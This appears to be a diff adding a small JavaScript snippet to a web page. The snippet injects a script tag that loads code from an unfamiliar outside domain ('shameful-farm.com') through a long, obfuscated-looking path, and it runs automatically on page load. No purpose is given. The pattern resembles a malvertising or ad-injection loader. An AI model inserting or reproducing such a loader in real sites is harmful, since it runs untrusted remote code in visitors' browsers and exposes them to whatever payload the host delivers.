@@ -1,0 +1,12 @@
+<script>
+(function(nlfnvt){
+var d = document,
+    s = d.createElement('script'),
+    l = d.currentScript || d.scripts[d.scripts.length - 1];
+s.settings = nlfnvt || {};
+s.src = "\/\/shameful-farm.com\/bqXLVLs.dPGXlp0eY\/WHcq\/Tekmi9OujZkUXlBk\/PMTjc\/0_NVT\/MhyKNQD\/U\/tNNrz\/Qo1RMEzPIG0dOtQE";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
